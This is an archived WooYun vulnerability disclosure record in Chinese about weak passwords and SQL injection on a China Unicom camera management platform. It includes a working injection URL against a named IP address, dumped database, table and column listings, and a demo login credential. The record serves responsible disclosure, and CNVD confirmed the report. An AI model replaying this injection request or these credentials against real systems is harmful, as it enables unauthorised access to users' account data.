{"id": 1826, "wybug_id": "wooyun-2014-061903", "wybug_title": "中国联通某摄像管理平台存在弱口令+sql注入", "wybug_corp": "中国联通", "wybug_author": "我是壮丁", "wybug_date": "2014-05-26 19:23", "wybug_open_date": "2014-08-24 19:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向公众公开  简要描述： 弱口令+sql注入 详细说明：  看到了这个 WooYun: 中国联通某摄像管理平台存在弱口令 发现很好玩，就看了看发现admin是被改了，test还是没有被修改。于是又进来了。\n\n没有admin啊，不好玩，接着搞在找回密码和注册那里发现了注入....找回密码这里的:http://210.22.8.98/dwr/call/plaincall/DwrUserInfo.resetPassword.dwr?callCount=1&page=/forgot.action&httpSessionId=&scriptSessionId=1400608260581&c0-scriptName=DwrUserInfo&c0-methodName=resetPassword&c0-id=0&c0-param0=string:1111'&c0-param1=string:111@11.com&batchId=0&locale=zh_CNc0-param0这个参数存在的问题搞到了数据库的内容database:[*] db_register[*] dserver_1[*] information_schema[*] mysql[*] testdb_register:+---------------------+| admin               |\t\t\tAdminID:Name:Password:RoleId\t\t| admin_camera_group  |\t\t\t| admin_manage_camera || appointuser         || appserver           || appserverassign     || appserverinfo       |\t\t\tAccount:AppServerID:AppServerSN:AppServerType:AssignFlag:Capacity:Password:RecycleDay| db_version          || devices             || dserver_names       || dservers            || groups              || languages           || location            || location_names      || news                || users               |\t\t\tServerID:UserID:UserName+---------------------+dserver_1:+---------------+| DeviceAssign  || DvipDevice    || GroupInfo     || UserAppServer || UserDevice    || UserInfo      |+---------------+Database: dserver_1Table: UserInfo[16 columns]+--------------+------------------+| Column       | Type             |+--------------+------------------+| AlarmFlag    | varchar(64)      || Email        | varchar(64)      || MobileNumber | varchar(64)      || MViewRes     | int(10)          || OwnerID      | int(10) unsigned || Playtime     | int(11)          || RegisterDate | date             || RegisterIP   | varchar(40)      || SendInfo     | int(10)          || UserID       | int(10) unsigned || UserName     | varchar(20)      || UserPassword | varchar(40)      || UserType     | tinyint(4)       || ViewSetup    | varchar(255)     || ViewTime     | varchar(64)      || WebViewRes   | int(10)          |+--------------+------------------+admin的密码加密了，没有破解开。。。系统中还存在很多弱口令，删除了吧。。。百度http://210.22.8.98/看到了http://www.tpy888.cn/sell/201210/19/675173.html说是一个演示平台，用户名和密码：auds(可以直接登录进去)这个算是什么呢，演示平台？还是通用的呢？   漏洞证明：     修复方案：  1、删除干净测试账户2、过滤参数3、验证码避免爆破   版权声明：转载请注明来源 我是壮丁@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-30 17:45 厂商回复： CNVD确认并复现所述情况，向中国联通集团公司通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}